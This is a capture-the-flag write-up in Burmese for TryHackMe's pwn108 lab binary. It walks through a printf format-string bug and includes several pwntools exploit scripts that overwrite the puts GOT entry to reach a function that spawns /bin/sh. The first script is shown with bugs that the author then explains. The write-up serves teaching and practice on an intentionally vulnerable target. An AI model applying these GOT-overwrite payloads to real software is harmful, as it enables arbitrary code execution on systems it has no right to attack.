#### pwn108

```c
pwndbg> checksec
File:     /home/Jackfruit/cate/learn/binary/stack/tryhackme/pwn108/pwn108-1644300489260.pwn108
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No

```

security ကတော့လွှတ်ပေးထားတယ်
`RELRO:      Partial RELRO` GOT address တွေ overwrite လုပ်လို့ရပါတယ်ပေါ့
`PIE:        No PIE (0x400000)` ဆိုတော့ local instruction address နဲ့ remote instruction addressတူတူပါဘဲပေါ့ 

```c

void main(void)

{
  long in_FS_OFFSET;
  undefined1 name [32];
  char reg_no [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts(&DAT_00402177);
  puts(&DAT_00402198);
  printf("\n=[Your name]: ");
  read(0,name,0x12);
  printf("=[Your Reg No]: ");
  read(0,reg_no,100);
  puts("\n=[ STUDENT PROFILE ]=");
  printf("Name         : %s",name);
  printf("Register no  : ");
  printf(reg_no);
  printf("Institue     : THM");
  puts("\nBranch       : B.E (Binary Exploitation)\n");
  puts(
      "\n                    =[ EXAM SCHEDULE ]=                  \n ------------------------------- -------------------------\n|  Date     |           Exam               |    FN/AN    |\n|------ --------------------------------------------------\n| 1/2/2022  |  PROGRAMMING IN ASSEMBLY     |     FN      |\n|--------------------------------------------------------\n| 3/2/2022  |  DA TA STRUCTURES             |     FN      |\n|-------------------------------------------------- ------\n| 3/2/2022  |  RETURN ORIENTED PROGRAMMING |     AN      |\n|------------------------- -------------------------------\n| 7/2/2022  |  SCRIPTING WITH PYTHON       |     FN      |\n --------------------------------------------------------"
      );
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                      /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
```

`  printf(reg_no);` ဒီကောင်ရှိတယ်ဆိုတော့ `prinf vuln` ကိုသုံးလို့ရ

```c

void holidays(void)

{
  long in_FS_OFFSET;
  undefined4 local_16;
  undefined2 local_12;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_16 = 0x6d617865;
  local_12 = 0x73;
  printf(&DAT_00402120,&local_16);
  system("/bin/sh");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                      /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

GOTကို overwrite ပြီး `system() function` ဆီသွားမယ်


```c

pwndbg> disas holidays 
Dump of assembler code for function holidays:
   0x000000000040123b <+0>:     push   rbp
   0x000000000040123c <+1>:     mov    rbp,rsp
   0x000000000040123f <+4>:     sub    rsp,0x10
   0x0000000000401243 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x000000000040124c <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401250 <+21>:    xor    eax,eax
   0x0000000000401252 <+23>:    mov    DWORD PTR [rbp-0xe],0x6d617865
   0x0000000000401259 <+30>:    mov    WORD PTR [rbp-0xa],0x73
   0x000000000040125f <+36>:    lea    rax,[rbp-0xe]
   0x0000000000401263 <+40>:    mov    rsi,rax
   0x0000000000401266 <+43>:    lea    rax,[rip+0xeb3]        # 0x402120
   0x000000000040126d <+50>:    mov    rdi,rax
   0x0000000000401270 <+53>:    mov    eax,0x0
   0x0000000000401275 <+58>:    call   0x401060 <printf@plt>
   0x000000000040127a <+63>:    lea    rax,[rip+0xeee]        # 0x40216f
   0x0000000000401281 <+70>:    mov    rdi,rax
   0x0000000000401284 <+73>:    call   0x401050 <system@plt>
   0x0000000000401289 <+78>:    nop
   0x000000000040128a <+79>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040128e <+83>:    sub    rax,QWORD PTR fs:0x28
   0x0000000000401297 <+92>:    je     0x40129e <holidays+99>
   0x0000000000401299 <+94>:    call   0x401040 <__stack_chk_fail@plt>
   0x000000000040129e <+99>:    leave
   0x000000000040129f <+100>:   ret
End of assembler dump.
pwndbg> disas 0x401030
Dump of assembler code for function puts@plt:
   0x0000000000401030 <+0>:     jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 <puts@got.plt>
   0x0000000000401036 <+6>:     push   0x0
   0x000000000040103b <+11>:    jmp    0x401020
End of assembler dump.
pwndbg> x/wg 0x404018
0x404018 <puts@got.plt>:        0x00007ffff7c80e60
pwndbg> 

```

ထုံစံအတိုင်း script

```python 
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn108-1644300489260.pwn108"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.173.178", 9008)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            b *0x000000000040131e
            b *0x0000000000401357
            b *0x00000000004013bd
            b *0x0000000000401348
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):

    
    payload += p64(0x404018) + p64(0x404019) + p64(0x40401a) 
    payload += b"%59c%10$hhn"      
    payload += b"%215c%11$hhn"     
    payload += b"%46c%12$hhn"      


    p.recvuntil(b"name]: ")
    p.sendline(b"hello")
    p.recvuntil(b"Reg No]: ")
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```

ဒီမှာအမှားတစ် (2) ခုရှိတယ်
ပထမက 64bit 8 byte ဆို‌တော့ 8 byte စာပြောင်းရမယ် 1 byte စီပြောင်းရင် 8 byte 8 ခုစာပေါ့
ဒုတိယ တစ်ခုက  read နဲ့ ဖတ်တယ် read က raw byteတွေဖတ်တယ် နောက်တစ်ခုက prinf က null byte (\x00) ကို terminator အဖြစ်သတ်မှတ်တယ်
ဆိုတော့ ငါတို့ paylaod ဖတ်ဖတ်ချင်းမှာ  (\x00) တွေ့ရင်ဖတ်တာရပ်သွားမယ်
ဆိုတော့ memory address တွေကိုနောက်မှထည့်မယ်

နောက်ပြီး  8 byte စာပြောင်းရမှာအတွက်က ကြည့်လိုက်ရင် သွားမယ့် address က
`0x000000000040123b` ဆိုတော့ 0တွေချည်းဘဲ ဆိုတော့ ငါတို့ က 8 byte စာကို ln သုံးပြီး  0x3b(59) ကို အရင်ဖြည့်ထားတယ်
ပြီးမှ 12 ရယ် 40 ရယ်ဖြည့်မယ် 0x12 (18) ဆိုတော့ 0x12 က 0x3b ထပ်ငယ်တော့ wrap around သုံးရမှာ ဆိုတော့ 0x12အစား 0x40(64) ကို $nနဲ့တစ်နေရာကျော်ပြီး ဖြည့်လိုက်ရင် wrap around သုံးစရာမလိုတော့ဘူး
ဆိုတော့ပြီးမှ 12 ကို ဖြည့်မယ်

```python

from pwn import *


context.log_level = 'info'
context.binary = "./pwn108-1644300489260.pwn108"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.173.178", 9008)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            b *0x000000000040131e
            b *0x0000000000401357
            b *0x00000000004013bd
            b *0x0000000000401348
            b *0x000000000040139a
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    payload = b"%59c%14$ln"      # writes 0x3b
    payload += b"%5c%15$hhn"     # writes 0x44 
    payload += b"%210c%16$hhn"      # writes 12
    payload = payload.ljust(32, b"A")
    payload += p64(0x404018) + p64(0x40401a) + p64(0x404019)
    
    p.recvuntil(b"name]: ")
    p.sendline(b"hello")
    p.recvuntil(b"Reg No]: ")
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
    

```

```python
payload = payload.ljust(32, b"A")
```
ဒီကောင်က payload length ကို ညှီပေးတာ ဒါမှနောက်က memory addressတွေကတိကျမှာ
32 ဆိုတော့ 4 ခုစာ ဆိုတော့ ငါတော့ memory addresssတွေအတွက်က အစက offset 10 + 4 = 14 ဆိုပြီးဖြစ်သွားမယ်



fmstr_payload() function script:
```python
from pwn import *


context.log_level = 'info'
context.binary = "./pwn108-1644300489260.pwn108"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.173.178", 9008)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            b *0x000000000040131e
            b *0x0000000000401357
            b *0x00000000004013bd
            b *0x0000000000401348
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    
    win_addr = 0x40123b 
    target_got = 0x404018 

    offset = 10 # printf သုံးပြီး buffer အစထိ offset

    # fmtstr_payload က null byte ပြဿနာနဲ့ alignment ကို အလိုအလျောက် ရှင်းပေးပါတယ်
    payload = fmtstr_payload(offset, {target_got: win_addr})
    print(payload.decode())
    p.recvuntil(b"name]: ")
    p.sendline(b"hello")
    p.recvuntil(b"Reg No]: ")
    p.sendline(payload)
    print(payload.decode())
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```



```python
from pwn import *

# Addresses to write to
addr1 = 0x404018        # targets 0x3b
addr2 = 0x404018 + 1    # targets 0x12
addr3 = 0x404018 + 2    # targets 0x40

# 1. Format string structure
# ရှေ့ဆုံးက format string ရဲ့ အရှည်ကို ကြည့်ရအောင်
# "%59c%10$hhn%215c%11$hhn%46c%12$hhn" = 34 bytes
fmt = b"%59c%10$hhn%215c%11$hhn%46c%12$hhn"

# 2. Padding (Alignment)
# x64 မှာ address တွေက 8-byte boundary မှာ ရှိရမယ်
# 34 ကို 8 နဲ့ စားလို့ ပြတ်အောင် 40 ဖြစ်တဲ့အထိ padding ထည့်မယ် (6 bytes)
payload = fmt + b"A" * 6

# 3. Adjusting Offsets
# အပေါ်က payload (40 bytes) ဟာ 8-byte slots ၅ ခု (40/8 = 5) ယူထားတယ်
# သင်က offset 10 မှာ စတယ်ဆိုရင် ဒီ payload ကြောင့် address တွေက
# offset 10+5 = 15 နေရာကို ရောက်သွားပါမယ်။
# ဒါကြောင့် format string ထဲက 10, 11, 12 ကို 15, 16, 17 လို့ ပြင်ပေးရမယ်

final_fmt = b"%59c%15$hhn%215c%16$hhn%46c%17$hhn"
payload = final_fmt.ljust(40, b"A") # 40 bytes အပြည့်ဖြည့်

# 4. Attach Addresses
payload += p64(addr1)
payload += p64(addr2)
payload += p64(addr3)

# Send payload
# io.sendline(payload)
```


```c
def exploit(p):
    # holiday address (သို့) win function address ကို ရှာပါ
    # ဥပမာ 0x40123b ဆိုပါစို့
    win_addr = 0x40123b 
    target_got = 0x404018 # puts@got

    # Offset 10 ကနေ စစမ်းကြည့်ပါ (GDB မှာ %10$p နဲ့ အရင်စစ်ပါ)
    # pwn108 မှာ 'Register no : ' စာသားက 12 characters ရှိတာ သတိပြုပါ
    offset = 10 

    # fmtstr_payload က null byte ပြဿနာနဲ့ alignment ကို အလိုအလျောက် ရှင်းပေးပါတယ်
    payload = fmtstr_payload(offset, {target_got: win_addr})

    p.sendlineafter(b"name]: ", b"hello")
    p.sendlineafter(b"Reg No]: ", payload)
    p.interactive()
```

